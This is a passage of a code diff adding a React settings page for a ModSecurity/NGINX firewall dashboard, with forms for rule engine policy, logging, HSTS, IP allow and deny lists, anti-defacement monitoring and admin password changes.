+  const [logFormat, setLogFormat] = useState('JSON');
+  const [concurrentLogging, setConcurrentLogging] = useState(true);
+  const [retention, setRetention] = useState('30 Days');
+
+  // Security Settings
+  const [currentPassword, setCurrentPassword] = useState('');
+  const [newPassword, setNewPassword] = useState('');
+  const [confirmPassword, setConfirmPassword] = useState('');
+  const [sessionTimeout, setSessionTimeout] = useState('1h');
+
+
+
+  // Hardening & Cloaking Settings
+  const [hstsEnabled, setHstsEnabled] = useState(true);
+  const [hstsMaxAge, setHstsMaxAge] = useState(31536000);
+  const [serverCloaking, setServerCloaking] = useState(true);
+  const [ipBlacklist, setIpBlacklist] = useState("");
+  const [ipWhitelist, setIpWhitelist] = useState("");
+
+  // Anti-Defacement Settings
+  const [defacementEnabled, setDefacementEnabled] = useState(true);
+  const [defacementFiles, setDefacementFiles] = useState("");
+  const [checkInterval, setCheckInterval] = useState(5);
+
+  // Notifications & State Controls
+  const [toast, setToast] = useState(null);
+  const [dangerModal, setDangerModal] = useState(null);
+  const [loadingAction, setLoadingAction] = useState(false);
+  const [activeSettingTab, setActiveSettingTab] = useState('general');
+
+  useEffect(() => {
+    const fetchSettings = async () => {
+      try {
+        const [gen, logs, waf, hardening, defacement] = await Promise.all([
+          getGeneralSettings(),
+          getLogSettings(),
+          getWafSettings(),
+          getHardeningSettings(),
+          getAntiDefacementSettings()
+        ]);
+
+        if (gen) {
+          if (gen.refreshInterval) setRefreshInterval(gen.refreshInterval);
+          if (gen.logsPerPage) setLogsPerPage(gen.logsPerPage);
+          if (gen.liveUpdates !== undefined) setLiveUpdates(gen.liveUpdates);
+        }
+        if (logs) {
+          if (logs.auditEnabled !== undefined) setAuditEnabled(logs.auditEnabled);
+          if (logs.logFormat) setLogFormat(logs.logFormat);
+          if (logs.concurrentLogging !== undefined) setConcurrentLogging(logs.concurrentLogging);
+          if (logs.retention) setRetention(logs.retention);
+        }
+        if (waf) {
+          if (waf.secRuleEngine) setSecRuleEngine(waf.secRuleEngine);
+          if (waf.detectionMode) setDetectionMode(waf.detectionMode);
+          if (waf.paranoiaLevel !== undefined) setParanoiaLevel(waf.paranoiaLevel);
+        }
+
+        if (hardening) {
+          if (hardening.hsts_enabled !== undefined) setHstsEnabled(hardening.hsts_enabled);
+          if (hardening.hsts_max_age !== undefined) setHstsMaxAge(hardening.hsts_max_age);
+          if (hardening.server_cloaking !== undefined) setServerCloaking(hardening.server_cloaking);
+          if (hardening.ip_blacklist !== undefined) setIpBlacklist(hardening.ip_blacklist.join(', '));
+          if (hardening.ip_whitelist !== undefined) setIpWhitelist(hardening.ip_whitelist.join(', '));
+        }
+        if (defacement) {
+          if (defacement.enabled !== undefined) setDefacementEnabled(defacement.enabled);
+          if (defacement.monitored_files !== undefined) setDefacementFiles(defacement.monitored_files.join(', '));
+          if (defacement.check_interval_seconds !== undefined) setCheckInterval(defacement.check_interval_seconds);
+        }
+      } catch (err) {
+        console.error("Failed to load WAF settings from API", err);
+      }
+    };
+    fetchSettings();
+  }, []);
+
+  const showToast = (message, type = 'success') => {
+    setToast({ message, type });
+    setTimeout(() => setToast(null), 4000);
+  };
+
+  const handleSaveGeneral = async (e) => {
+    e.preventDefault();
+    setLoadingAction(true);
+    try {
+      await saveGeneralSettings({
+        refreshInterval,
+        logsPerPage,
+        liveUpdates
+      });
+      showToast("General preferences saved successfully.");
+    } catch (err) {
+      showToast(err.message || "Failed to save general settings.", "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  const handleSaveWAF = async (e) => {
+    e.preventDefault();
+    setLoadingAction(true);
+    try {
+      await saveWafSettings({
+        secRuleEngine,
+        detectionMode,
+        paranoiaLevel
+      });
+      showToast("WAF core policies updated successfully.");
+    } catch (err) {
+      showToast(err.message || "Failed to save WAF settings.", "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+
+
+  const handleSaveHardening = async (e) => {
+    e.preventDefault();
+    setLoadingAction(true);
+    try {
+      const blacklist = ipBlacklist.split(',').map(ip => ip.trim()).filter(ip => ip);
+      const whitelist = ipWhitelist.split(',').map(ip => ip.trim()).filter(ip => ip);
+      await saveHardeningSettings({
+        hsts_enabled: hstsEnabled,
+        hsts_max_age: parseInt(hstsMaxAge) || 31536000,
+        server_cloaking: serverCloaking,
+        ip_blacklist: blacklist,
+        ip_whitelist: whitelist
+      });
+      showToast("Hardening & Server Cloaking policies updated and applied to NGINX.");
+    } catch (err) {
+      showToast("Failed to update hardening settings: " + (err.message || "Unknown error"), "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  const handleSaveDefacement = async (e) => {
+    e.preventDefault();
+    setLoadingAction(true);
+    try {
+      const files = defacementFiles.split(',').map(f => f.trim()).filter(f => f);
+      await saveAntiDefacementSettings({
+        enabled: defacementEnabled,
+        monitored_files: files,
+        check_interval_seconds: parseInt(checkInterval) || 5
+      });
+      showToast("Web Anti-Defacement policies updated successfully.");
+    } catch (err) {
+      showToast("Failed to update Anti-Defacement settings: " + (err.message || "Unknown error"), "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  const handleSaveLogs = async (e) => {
+    e.preventDefault();
+    setLoadingAction(true);
+    try {
+      await saveLogSettings({
+        auditEnabled,
+        logFormat,
+        concurrentLogging,
+        retention
+      });
+      showToast("Log ingestion configurations successfully updated.");
+    } catch (err) {
+      showToast(err.message || "Failed to update log settings.", "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  const handleChangePassword = async (e) => {
+    e.preventDefault();
+    if (!newPassword || newPassword !== confirmPassword) {
+      showToast("Passwords do not match or are blank.", "error");
+      return;
+    }
+    setLoadingAction(true);
+    try {
+      const res = await changeAdminPassword(currentPassword, newPassword);
+      showToast(res.message || "Administrator password updated successfully!");
+      setCurrentPassword('');
+      setNewPassword('');
+      setConfirmPassword('');
+    } catch (err) {
+      showToast(err.message || "Failed to change admin password.", "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  const confirmDangerAction = async () => {
+    const action = dangerModal;
+    setDangerModal(null);
+    setLoadingAction(true);
+    try {
+      if (action === 'restart') {
+        const res = await restartWafEngine();
+        showToast(res.message || "WAF ModSecurity Engine container restarted successfully.");
+      } else if (action === 'nginx') {
+        const res = await reloadNginxProxy();
+        showToast(res.message || "NGINX service reloaded gracefully.");
+      } else if (action === 'cache') {
+        const res = await purgeStatsCache();
+        showToast(res.message || "Dashboard analytics cache purged and rebuilt.");
+      } else if (action === 'sync') {
+        const res = await syncSignatures();
+        showToast(res.message || "OWASP CRS signatures synced successfully.");
+      }
+    } catch (err) {
+      showToast(err.message || "Administrative action failed.", "error");
+    } finally {
+      setLoadingAction(false);
+    }
+  };
+
+  return (
+    <motion.div
+      className="settings-container animate-fade-in"
+      initial={{ opacity: 0, y: 10 }}
+      animate={{ opacity: 1, y: 0 }}
+      transition={{ duration: 0.4 }}
+    >
+      {/* Toast Alert overlay */}
+      <AnimatePresence>
+        {toast && (
+          <motion.div
+            initial={{ opacity: 0, y: -20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            className={`toast-alert ${toast.type === 'error' ? 'error' : 'success'}`}
+            style={{
+              position: 'fixed',
+              top: '24px',
+              right: '24px',
+              zIndex: 9999,
+              padding: '12px 24px',
+              borderRadius: '8px',
+              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
+              display: 'flex',
+              alignItems: 'center',
+              gap: '10px',
+              background: toast.type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 'rgba(16, 185, 129, 0.95)',
+              border: '1px solid rgba(255,255,255,0.1)',
+              color: '#fff',
+              fontWeight: 500
+            }}
+          >
+            <ShieldAlert size={18} />
+            <span>{toast.message}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* Danger Modal confirmation prompt */}
+      <AnimatePresence>
+        {dangerModal && (
+          <div className="modal-overlay" style={{ zIndex: 1100 }}>
+            <motion.div
+              className="modal-content pulse-warning"
+              style={{ maxWidth: '480px', border: '1px solid rgba(239, 68, 68, 0.35)' }}
+              initial={{ scale: 0.95, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.95, opacity: 0 }}
+            >
+              <div className="modal-header" style={{ background: 'rgba(239, 68, 68, 0.03)', borderBottom: '1px solid rgba(239,68,68,0.15)' }}>
+                <div className="modal-title" style={{ color: '#fca5a5' }}>
+                  <AlertTriangle size={20} color="#ef4444" />
+                  <span>Administrative Action Confirmation</span>
+                </div>
+                <button className="modal-close-btn" onClick={() => setDangerModal(null)}>
+                  <X size={18} />
+                </button>
+              </div>
+
+              <div style={{ padding: '20px 24px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                <div style={{ fontSize: '13px', color: '#e4e4e7', lineHeight: '1.5' }}>
+                  {dangerModal === 'restart' && "Are you sure you want to restart the CyberSentinel WAF protection engine? This will momentarily disrupt active connection guards."}
+                  {dangerModal === 'nginx' && "Are you sure you want to gracefully reload NGINX configurations? This will apply all pending rule changes."}
+                  {dangerModal === 'cache' && "Are you sure you want to clear the dashboard local metrics cache? The dashboard data will reload from raw logs."}
+                  {dangerModal === 'sync' && "Are you sure you want to download and synchronize the latest OWASP Core Rule Set signatures? This will update your protection definitions."}
+                </div>
+
+                <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
+                  <button
+                    onClick={() => setDangerModal(null)}
+                    className="action-btn-inspect"
+                    style={{ background: 'transparent', color: '#a1a1aa', borderColor: 'rgba(255,255,255,0.1)' }}
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={confirmDangerAction}
+                    className="action-btn-inspect"
+                    style={{ background: '#ef4444', color: '#fff', borderColor: 'transparent', padding: '6px 16px' }}
+                  >
+                    Confirm Action
+                  </button>
+                </div>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+            <div className="settings-layout" style={{ display: 'flex', gap: '32px', alignItems: 'flex-start' }}>
+        
+        {/* Sidebar Navigation */}
+        <div className="settings-sidebar">
+          <div style={{ fontSize: '11px', fontWeight: 600, color: '#71717a', textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '8px', paddingLeft: '12px' }}>Configuration</div>
+          
+          <button onClick={() => setActiveSettingTab('general')} className={`settings-tab-btn ${activeSettingTab === 'general' ? 'active' : ''}`}>
+            <SettingsIcon size={18} /> General Setup
+          </button>
+          <button onClick={() => setActiveSettingTab('waf')} className={`settings-tab-btn ${activeSettingTab === 'waf' ? 'active' : ''}`}>
+            <ShieldCheck size={18} /> WAF Engine Policies
+          </button>
+          <button onClick={() => setActiveSettingTab('logs')} className={`settings-tab-btn ${activeSettingTab === 'logs' ? 'active' : ''}`}>
+            <Database size={18} /> Log Pipeline
+          </button>
+          <button onClick={() => setActiveSettingTab('hardening')} className={`settings-tab-btn ${activeSettingTab === 'hardening' ? 'active' : ''}`}>
+            <Server size={18} /> Server Hardening
+          </button>
+          <button onClick={() => setActiveSettingTab('defacement')} className={`settings-tab-btn ${activeSettingTab === 'defacement' ? 'active' : ''}`}>
+            <ShieldAlert size={18} /> Anti-Defacement
+          </button>
+          <button onClick={() => setActiveSettingTab('security')} className={`settings-tab-btn ${activeSettingTab === 'security' ? 'active' : ''}`}>
+            <Lock size={18} /> Security & Danger Zone
+          </button>
+        </div>
+
+        {/* Main Content Area */}
+        <div className="settings-content-area">
+          <AnimatePresence mode="wait">
+
+            {activeSettingTab === 'general' && (
+              <motion.div key="general" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <SettingsIcon size={20} color="#3b82f6" />
+                  General Settings
+                </div>
+                <div className="settings-section-subtitle">Configure dashboard behavior and real-time updates.</div>
+                
+                <form onSubmit={handleSaveGeneral} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Dashboard Refresh Interval</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={refreshInterval} onChange={(e) => setRefreshInterval(e.target.value)}>
+                      <option value="3s">3 Seconds (Sync Active)</option>
+                      <option value="5s">5 Seconds (Recommended)</option>
+                      <option value="10s">10 Seconds</option>
+                      <option value="30s">30 Seconds</option>
+                      <option value="off">Disabled / Manual</option>
+                    </select>
+                  </div>
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Live Logs Per Page</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={logsPerPage} onChange={(e) => setLogsPerPage(e.target.value)}>
+                      <option value="10">10 entries</option>
+                      <option value="15">15 entries</option>
+                      <option value="25">25 entries</option>
+                      <option value="50">50 entries</option>
+                      <option value="100">100 entries</option>
+                    </select>
+                  </div>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '10px', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Live Inbound Stream</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Stream logs dynamically from the backend</span>
+                    </div>
+                    <div className={`toggle-switch ${liveUpdates ? 'active' : ''}`} onClick={() => setLiveUpdates(!liveUpdates)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
+                      Save General Preferences
+                    </button>
+                  </div>
+                </form>
+              </motion.div>
+            )}
+
+            {activeSettingTab === 'waf' && (
+              <motion.div key="waf" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <ShieldCheck size={20} color="#3b82f6" />
+                  WAF Engine Policies
+                </div>
+                <div className="settings-section-subtitle">Manage ModSecurity ruleset behaviors and blocking modes.</div>
+                
+                <form onSubmit={handleSaveWAF} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>SecRuleEngine Posture</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={secRuleEngine} onChange={(e) => setSecRuleEngine(e.target.value)}>
+                      <option value="On">On (Active Blocking Guard)</option>
+                      <option value="DetectionOnly">DetectionOnly (Simulate Attacks)</option>
+                      <option value="Off">Off (Bypass WAF Shields - Critical Risk)</option>
+                    </select>
+                  </div>
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Response Filtering Mode</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={detectionMode} onChange={(e) => setDetectionMode(e.target.value)}>
+                      <option value="Blocking">Strict Block & Drop (403 Forbidden)</option>
+                      <option value="Detection">Log Analysis Only (Bypass drops)</option>
+                    </select>
+                  </div>
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '10px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa', display: 'flex', justifyContent: 'space-between' }}>
+                      <span>Global Paranoia Setting</span>
+                      <strong style={{ color: '#3b82f6', fontSize: '14px' }}>PL{paranoiaLevel}</strong>
+                    </label>
+                    <input
+                      type="range"
+                      min="1"
+                      max="4"
+                      value={paranoiaLevel}
+                      onChange={(e) => setParanoiaLevel(parseInt(e.target.value))}
+                      style={{ width: '100%', height: '8px', background: 'rgba(255,255,255,0.06)', borderRadius: '4px', outline: 'none', appearance: 'none', accentColor: '#3b82f6', marginTop: '8px' }}
+                    />
+                    <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', color: '#71717a', marginTop: '6px' }}>
+                      <span>PL1: Standard</span>
+                      <span>PL2</span>
+                      <span>PL3</span>
+                      <span>PL4: Paranoid</span>
+                    </div>
+                  </div>
+                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+                    <button type="submit" disabled={loadingAction} className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
+                      {loadingAction ? 'Updating Ruleset...' : 'Update WAF Policies'}
+                    </button>
+                  </div>
+                </form>
+              </motion.div>
+            )}
+
+            {activeSettingTab === 'logs' && (
+              <motion.div key="logs" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <Database size={20} color="#3b82f6" />
+                  Log Pipeline Configuration
+                </div>
+                <div className="settings-section-subtitle">Configure SecAuditEngine and log retention policies.</div>
+                
+                <form onSubmit={handleSaveLogs} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>SecAuditEngine Logging</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Record details of flagged transactions</span>
+                    </div>
+                    <div className={`toggle-switch ${auditEnabled ? 'active' : ''}`} onClick={() => setAuditEnabled(!auditEnabled)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+                  
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Audit Log Structure Formats</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={logFormat} onChange={(e) => setLogFormat(e.target.value)}>
+                      <option value="JSON">Structured JSON (RFC 8259 Standard)</option>
+                      <option value="Native">ModSecurity Native Audit Structure</option>
+                    </select>
+                  </div>
+                  
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Concurrent Multi-Threading</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Non-blocking log processing pipeline</span>
+                    </div>
+                    <div className={`toggle-switch ${concurrentLogging ? 'active' : ''}`} onClick={() => setConcurrentLogging(!concurrentLogging)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+                  
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Log Retention Period</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={retention} onChange={(e) => setRetention(e.target.value)}>
+                      <option value="7 Days">7 Days</option>
+                      <option value="30 Days">30 Days</option>
+                      <option value="90 Days">90 Days</option>
+                      <option value="1 Year">1 Year</option>
+                      <option value="Forever">Infinite / Log Rotation Disabled</option>
+                    </select>
+                  </div>
+                  
+                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
+                      Update Logging Configuration
+                    </button>
+                  </div>
+                </form>
+              </motion.div>
+            )}
+
+            {activeSettingTab === 'hardening' && (
+              <motion.div key="hardening" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <Server size={20} color="#3b82f6" />
+                  Infrastructure Hardening
+                </div>
+                <div className="settings-section-subtitle">Manage HSTS, server cloaking, and IP restrictions.</div>
+                
+                <form onSubmit={handleSaveHardening} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Strict HTTPS (HSTS)</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Enforce Strict-Transport-Security header</span>
+                    </div>
+                    <div className={`toggle-switch ${hstsEnabled ? 'active' : ''}`} onClick={() => setHstsEnabled(!hstsEnabled)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+
+                  <AnimatePresence>
+                    {hstsEnabled && (
+                      <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: 'auto' }} exit={{ opacity: 0, height: 0 }} style={{ overflow: 'hidden' }}>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', paddingBottom: '10px' }}>
+                          <label style={{ fontSize: '13px', color: '#a1a1aa' }}>HSTS Max Age (Seconds)</label>
+                          <input
+                            type="number"
+                            className="settings-input"
+                            style={{ width: '100%', fontSize: '14px' }}
+                            value={hstsMaxAge}
+                            onChange={(e) => setHstsMaxAge(e.target.value)}
+                            placeholder="31536000"
+                          />
+                        </div>
+                      </motion.div>
+                    )}
+                  </AnimatePresence>
+
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Server Cloaking</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Scrub NGINX tokens & Express header disclosures</span>
+                    </div>
+                    <div className={`toggle-switch ${serverCloaking ? 'active' : ''}`} onClick={() => setServerCloaking(!serverCloaking)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Global IP Blacklist (Comma separated)</label>
+                    <textarea
+                      className="settings-input"
+                      style={{ width: '100%', minHeight: '80px', resize: 'vertical' }}
+                      value={ipBlacklist}
+                      onChange={(e) => setIpBlacklist(e.target.value)}
+                      placeholder="192.168.1.100, 10.0.0.50"
+                    />
+                  </div>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Global IP Whitelist (Comma separated)</label>
+                    <textarea
+                      className="settings-input"
+                      style={{ width: '100%', minHeight: '80px', resize: 'vertical' }}
+                      value={ipWhitelist}
+                      onChange={(e) => setIpWhitelist(e.target.value)}
+                      placeholder="192.168.1.10, 127.0.0.1"
+                    />
+                  </div>
+
+                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+                    <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px' }}>
+                      Apply Infrastructure Changes
+                    </button>
+                  </div>
+                </form>
+              </motion.div>
+            )}
+
+            {activeSettingTab === 'defacement' && (
+              <motion.div key="defacement" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <ShieldAlert size={20} color="#ef4444" />
+                  Anti-Defacement Protection
+                </div>
+                <div className="settings-section-subtitle">Real-time integrity monitoring for critical assets.</div>
+                
+                <form onSubmit={handleSaveDefacement} style={{ display: 'flex', flexDirection: 'column', gap: '20px', maxWidth: '600px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.05)' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                      <span style={{ fontSize: '14px', fontWeight: 500, color: '#e4e4e7' }}>Real-time Integrity Monitor</span>
+                      <span style={{ fontSize: '12px', color: '#a1a1aa' }}>Revert unauthorized content modifications instantly</span>
+                    </div>
+                    <div className={`toggle-switch ${defacementEnabled ? 'active' : ''}`} onClick={() => setDefacementEnabled(!defacementEnabled)}>
+                      <div className="toggle-knob"></div>
+                    </div>
+                  </div>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Audit Scan Interval (Seconds)</label>
+                    <select className="filter-select" style={{ width: '100%', padding: '12px', fontSize: '14px' }} value={checkInterval} onChange={(e) => setCheckInterval(parseInt(e.target.value))}>
+                      <option value="2">2 Seconds (High sensitivity)</option>
+                      <option value="5">5 Seconds (Recommended)</option>
+                      <option value="10">10 Seconds</option>
+                      <option value="30">30 Seconds</option>
+                    </select>
+                  </div>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                    <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Monitored Asset Filepaths (Comma separated)</label>
+                    <textarea
+                      className="settings-input"
+                      style={{ width: '100%', minHeight: '100px', resize: 'vertical' }}
+                      value={defacementFiles}
+                      onChange={(e) => setDefacementFiles(e.target.value)}
+                      placeholder="/var/www/html/index.html"
+                      required
+                    />
+                    <span style={{ fontSize: '11px', color: '#71717a', marginTop: '4px' }}>
+                      System background service prefetches and locks these files.
+                    </span>
+                  </div>
+
+                  <div style={{ marginTop: '20px', paddingTop: '20px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+                    <button type="submit" disabled={loadingAction} className="modal-btn primary" style={{ padding: '12px 24px', fontSize: '14px', background: 'var(--danger-color)' }}>
+                      {loadingAction ? 'Applying...' : 'Apply Defacement Protection'}
+                    </button>
+                  </div>
+                </form>
+              </motion.div>
+            )}
+
+            {activeSettingTab === 'security' && (
+              <motion.div key="security" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}>
+                <div className="settings-section-title">
+                  <Lock size={20} color="#3b82f6" />
+                  Admin Security & Danger Zone
+                </div>
+                <div className="settings-section-subtitle">Manage portal access credentials and system overrides.</div>
+                
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '40px', maxWidth: '600px' }}>
+                  
+                  {/* Password Form */}
+                  <form onSubmit={handleChangePassword} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                    <div style={{ fontSize: '15px', fontWeight: 600, color: '#f4f4f5', marginBottom: '8px' }}>Portal Authentication</div>
+                    
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Current Admin Password</label>
+                      <input type="password" placeholder="••••••••" className="settings-input" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)} required />
+                    </div>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>New Security Password</label>
+                      <input type="password" placeholder="••••••••" className="settings-input" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} required />
+                    </div>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Confirm New Password</label>
+                      <input type="password" placeholder="••••••••" className="settings-input" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} required />
+                    </div>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
+                      <label style={{ fontSize: '13px', color: '#a1a1aa' }}>Portal Session Timeout</label>
+                      <select className="filter-select" style={{ width: '100%', padding: '12px' }} value={sessionTimeout} onChange={(e) => setSessionTimeout(e.target.value)}>
+                        <option value="15m">15 Minutes</option>
+                        <option value="30m">30 Minutes</option>
+                        <option value="1h">1 Hour (Standard)</option>
+                        <option value="4h">4 Hours</option>
+                        <option value="12h">12 Hours</option>
+                        <option value="never">No Automatic Timeout</option>
+                      </select>
+                    </div>
+                    <div style={{ display: 'flex', gap: '12px', marginTop: '16px' }}>
+                      <button type="submit" className="modal-btn primary" style={{ padding: '12px 24px' }}>
+                        Update Credentials
+                      </button>
+                      <button type="button" onClick={onLogout} className="action-btn-inspect" style={{ background: 'rgba(239, 68, 68, 0.1)', color: '#ef4444', borderColor: 'rgba(239, 68, 68, 0.2)', padding: '12px 24px', fontSize: '13px' }}>
+                        Terminate Session
+                      </button>
+                    </div>
+                  </form>
+
+                  {/* Danger Zone */}
+                  <div style={{ background: 'linear-gradient(135deg, rgba(239, 68, 68, 0.05) 0%, rgba(0, 0, 0, 0) 100%)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: '16px', padding: '24px' }}>
+                    <div style={{ fontSize: '15px', fontWeight: 600, color: '#fca5a5', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '8px' }}>
